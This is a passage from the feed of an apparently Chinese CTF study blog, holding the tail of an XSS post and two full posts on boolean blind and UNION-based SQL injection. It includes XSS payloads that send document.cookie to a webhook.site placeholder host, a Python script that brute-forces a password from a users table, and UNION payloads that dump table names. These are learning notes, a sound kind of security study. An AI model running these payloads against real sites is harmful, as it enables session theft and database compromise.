src=&quot;//webhook.site/xxxxxxxx/?cookie=<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>&quot; &gt;`</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&quot;/&gt;&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="附：带src属性的标签"><a href="#附：带src属性的标签" class="headerlink" title="附：带src属性的标签"></a>附：带src属性的标签</h5><ol><li><p>**<code>&lt;img&gt;</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>**<code>&lt;script&gt;</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>**<code>&lt;iframe&gt;</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;page.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>&lt;video&gt;</code></strong> 和 **<code>&lt;audio&gt;</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;video.mp4&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;audio.mp3&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>&lt;embed&gt;</code></strong> 和 **<code>&lt;object&gt;</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;file.pdf&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/pdf&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;file.swf&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="更多正在学习中…"><a href="#更多正在学习中…" class="headerlink" title="更多正在学习中….."></a>更多正在学习中…..</h4><p><img src="/img/edit.png" alt="施工中"></p><p>jquery-ajax</p><p>iCeServer</p><p>Superagent</p><p>socket</p><p>axios</p><ol><li>jQuery AJAX</li></ol><p>首先确保你的项目中已经包含了jQuery。如果没有，你可以通过添加以下标签来引入：</p><p>html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发送请求的示例代码：</p><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>,</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>, <span class="comment">// 或者 &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, 等。</span></span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>Axios</li></ol><p>Axios不是原生支持的，需要引入。你可以通过CDN添加Axios：</p><p>html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用Axios发送请求：</p><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response.<span class="property">data</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li>Superagent</li></ol><p>Superagent也需要引入。通过CDN添加Superagent：</p><p>html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用Superagent发送请求：</p><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">superagent</span><br><span class="line">  .<span class="title function_">get</span>(<span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>)</span><br><span class="line">  .<span class="title function_">end</span>(<span class="function">(<span class="params">err, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123; <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, err); &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">body</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><ol start="4"><li>WebSocket</li></ol><p>WebSocket是HTML5的一部分，不需要额外引入。但WebSocket用于实现双向通信，不同于常规的HTTP请求。以下是一个简单的WebSocket示例：</p><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#x27;</span>);</span><br><span class="line"></span><br><span class="line">socket.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  socket.<span class="title function_">send</span>(<span class="string">&#x27;Hello Server!&#x27;</span>); <span class="comment">// 发送数据到服务器</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">socket.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Message from server &#x27;</span>, event.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="5"><li>Fetch API</li></ol><p>Fetch API是现代浏览器原生支持的，不需要引入任何额外的库：</p><p>javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>()) <span class="comment">// 假设服务器返回的是JSON数据</span></span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, error));</span><br></pre></td></tr></table></figure><p>请替换 <code>&#39;YOUR_ENDPOINT_HERE&#39;</code> 和 <code>&#39;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#39;</code> 为你实际的请求URL或WebSocket端点。每种方法都有其特定的使用场景和优势，选择合适的根据你的项目需求而定。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p>参考先知博主「Sh4d0w」的文章</p><p>原文链接：<a href="https://xz.aliyun.com/t/12370">https://xz.aliyun.com/t/12370</a></p></li><li><p>参考「hacktricks」学习指南中的文章</p><p>原文链接：<a href="https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#httponly">https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#httponly</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS简介：&quot;&gt;&lt;a href=&quot;#XSS简介：&quot; class=&quot;headerlink&quot; title=&quot;XSS简介：&quot;&gt;&lt;/a&gt;XSS简介：&lt;/h1&gt;&lt;p&gt;动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-XSS" scheme="https://we11s.github.io/tags/Web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-布尔盲注</title>
    <link href="https://we11s.github.io/posts/1685515616/"/>
    <id>https://we11s.github.io/posts/1685515616/</id>
    <published>2024-02-07T10:02:34.000Z</published>
    <updated>2024-03-12T16:28:50.841Z</updated>
    
    <content type="html"><![CDATA[<h2 id="布尔盲注介绍"><a href="#布尔盲注介绍" class="headerlink" title="布尔盲注介绍"></a>布尔盲注介绍</h2><p>构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息</p><p><strong>使用条件</strong>：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、）</p><p><strong>注意事项</strong>：</p><ul><li><p>前面参数在数据库<strong>无结果</strong>时，拼接语句使用关键词<code>or</code></p></li><li><p>前面参数在数据库<strong>有结果</strong>时，拼接语句使用关键词<code>and</code></p><p>另建议使用脚本</p></li></ul><h2 id="注入使用函数"><a href="#注入使用函数" class="headerlink" title="注入使用函数"></a>注入使用函数</h2><p><strong>1.</strong><code>substr()/substring()</code>函数</p><p>​<code>substr()/substring()</code>函数：用来截取数据库某个字段中的一部分。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string，<span class="keyword">start</span>开始位置，length截取长度)  #语法</span><br></pre></td></tr></table></figure><p>参数</p><ul><li>string：必选，数据库中需要截取的字段</li><li>start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。</li><li>length：可选，需要截取的长度。缺省。即截取到结束位置</li></ul><p><strong>2.</strong><code>ascii()</code>函数</p><p>​<code>ascii()</code>函数：返回字符串str的最左边的数值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(str)  #语法</span><br></pre></td></tr></table></figure><p><strong>3.</strong><code>length()</code> 函数</p><p>​<code>length()</code> 函数，返回字符串的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str) #语法</span><br></pre></td></tr></table></figure><p><strong>4.</strong><code>left()</code> 函数</p><p>​<code>left()</code> 函数，返回从左至右截取固定长度的字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(str,n) #语法 截取字符串str的从左至右前n个字符</span><br></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><ul><li>求当前数据库长度</li><li>求当前数据库表的ASCII (即爆出数据库名)</li><li>求当前数据库中表的个数</li><li>求当前数据库中其中一个表名的长度</li><li>求当前数据库中其中一个表名的ASCII</li><li>求列名的数量</li><li>求列名的长度</li><li>求列名的ASCII</li><li>求字段的数量</li><li>求字段内容的长度</li><li>求字段内容对应的ASCII</li></ul><h2 id="手工注入过程详解"><a href="#手工注入过程详解" class="headerlink" title="手工注入过程详解"></a>手工注入过程详解</h2><h3 id="基本模板"><a href="#基本模板" class="headerlink" title="基本模板"></a>基本模板</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (长度/字符函数(所爆数据的SQL) = n) --+</span></span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 #</span></span><br></pre></td></tr></table></figure><p>以爆数据库名字为例</p><h3 id="求长度"><a href="#求长度" class="headerlink" title="求长度"></a>求长度</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (length(database()) = n) --+</span></span><br></pre></td></tr></table></figure><p>通过页面的回显进行判断，数据库的长度是多少</p><h3 id="求数据库名称"><a href="#求数据库名称" class="headerlink" title="求数据库名称"></a>求数据库名称</h3><h3 id="使用left-函数"><a href="#使用left-函数" class="headerlink" title="使用left 函数"></a>使用<code>left</code> 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 从左至右截取一个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="comment">-- 从左只有截取两个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;**&#x27;</span>)</span><br><span class="line"><span class="comment">-- 从左只有截取n个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),n)<span class="operator">=</span><span class="string">&#x27;*****&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不断修改<code>*</code>中的字符，使之页面显示为<code>true</code>的类似项（如登录成功、成功等）</p><h3 id="使用SUBSTR函数"><a href="#使用SUBSTR函数" class="headerlink" title="使用SUBSTR函数"></a>使用<code>SUBSTR</code>函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 截取第1个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br><span class="line"><span class="comment">-- 截取第2个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br><span class="line"><span class="comment">-- 截取第n个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),n,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br></pre></td></tr></table></figure><p>不断修改<code>*</code>中的ASCII码，使之页面显示为<code>true</code>的类似项（如登录成功、成功等）</p><h2 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h2><p><strong>注意查看表单的提交变量名称</strong></p><p>使用POST提交数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length</span>(<span class="params">value</span>):  <span class="comment"># 获取要查询的数据的长度</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and length((&#123;0&#125;)) =&#123;1&#125; #&quot;</span>.<span class="built_in">format</span>(data_payload, n)</span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;  //注意查看表单的提交变量名称</span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        length = <span class="built_in">len</span>(html.text)</span><br><span class="line">        <span class="keyword">if</span> length &lt; value:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;……data length is :&quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">data_length, value</span>):  <span class="comment"># 获取数据</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, data_length):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(data_payload, i, <span class="built_in">ord</span>(char))</span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;  //注意查看表单的提交变量名称</span><br><span class="line">            html = requests.post(url, data=data)</span><br><span class="line">            length = <span class="built_in">len</span>(html.text)</span><br><span class="line">            <span class="keyword">if</span> length &lt; value:  <span class="comment"># 根据返回长度的不同来判断字符正确与否</span></span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;…… data is :&quot;</span> + result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://***.***.10.67:2081/hard.php&quot;</span></span><br><span class="line">data_payload = <span class="string">&quot;select password from users  limit 0,1&quot;</span> //所爆数据的sql语句</span><br><span class="line">value = <span class="number">550</span>  <span class="comment"># 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看</span></span><br><span class="line"></span><br><span class="line">length = get_length(value) +<span class="number">1</span></span><br><span class="line">get_data(length, value)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;布尔盲注介绍&quot;&gt;&lt;a href=&quot;#布尔盲注介绍&quot; class=&quot;headerlink&quot; title=&quot;布尔盲注介绍&quot;&gt;&lt;/a&gt;布尔盲注介绍&lt;/h2&gt;&lt;p&gt;构造SQL语句，利用and，or等关键字来其后的语句 &lt;code&gt;true&lt;/code&gt; 、 &lt;code&gt;f</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-SQL" scheme="https://we11s.github.io/tags/Web-SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-联合查询(union)注入</title>
    <link href="https://we11s.github.io/posts/1145624611/"/>
    <id>https://we11s.github.io/posts/1145624611/</id>
    <published>2024-02-07T10:02:26.000Z</published>
    <updated>2024-04-09T10:22:46.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="联合查询介绍"><a href="#联合查询介绍" class="headerlink" title="联合查询介绍"></a>联合查询介绍</h2><p><strong>联合查询语句：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a from b union select c from d where e;</span><br></pre></td></tr></table></figure><p><strong>使用条件</strong>：页面对查询语句有<strong>回显查询数据</strong></p><p><strong>注意事项</strong>：</p><ul><li><p>使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显)</p></li><li><p>若前部分有结果，可在每次的<code>union</code>查询后添加语句<code>limit n,1</code>(n根据题目实际进行切换)起到回显联合查询结果的作用</p><p>注：limit num1，num2的作用为<strong>从第num1行开始显示num2行内容</strong></p></li></ul><h2 id="所需函数"><a href="#所需函数" class="headerlink" title="所需函数"></a>所需函数</h2><p><strong>1.</strong><code>concat()</code>函数</p><p>​<code>concat()</code>函数：将多个<strong>不同字段</strong>的字符串连接成一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1，str2) #语法</span><br></pre></td></tr></table></figure><p>注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p><strong>2.</strong><code>group_concat()</code>函数</p><p>​<code>group_concat()</code> 将多个<strong>同个字段</strong>的字符串连接成一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span>] [separator ‘分隔符’]) #语法</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><ol><li><h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>链接：<a href="/posts/3000552397/#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">SQL注入-基础 | WELLS Blog</a></p></li><li><h3 id="字段数"><a href="#字段数" class="headerlink" title="字段数"></a>字段数</h3><p>联合查询(<code>union</code>)，必选保证<code>union</code>前后两个查询的字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此要对前一个的字段数进行判断。可以使用<code>order by 数字</code>进行判断</p><p><strong>注</strong>：<code>order by n</code>表示查询结果通过第n个字段进行排序</p><p>使用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by 1 --+</span><br></pre></td></tr></table></figure><p>使用时不断增大数字，假设直至第<code>n</code>个出现错误，从而判断出字段数为<code>n-1</code></p></li><li><h3 id="回显点"><a href="#回显点" class="headerlink" title="回显点"></a>回显点</h3><p>知道字段数之后，我们还需要确定在哪个字段是回显到页面上的</p><p>直接根据字段数，联合查询数字<code>1，2，3...</code>,以三个字段数为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p>从页面上查找回显的是哪个数字</p></li><li><h3 id="爆库名、表名，字段名，数据"><a href="#爆库名、表名，字段名，数据" class="headerlink" title="爆库名、表名，字段名，数据"></a>爆库名、表名，字段名，数据</h3></li></ol><p>​使用<code>union</code>语句在回显位置导出数据库中的数据，结合<a href="/posts/3000552397/#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">SQL注入-基础 | WELLS Blog</a>中的SQL注入常用基础语句</p><p>以2位置为回显点，爆表名为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;联合查询介绍&quot;&gt;&lt;a href=&quot;#联合查询介绍&quot; class=&quot;headerlink&quot; title=&quot;联合查询介绍&quot;&gt;&lt;/a&gt;联合查询介绍&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;联合查询语句：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight </summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
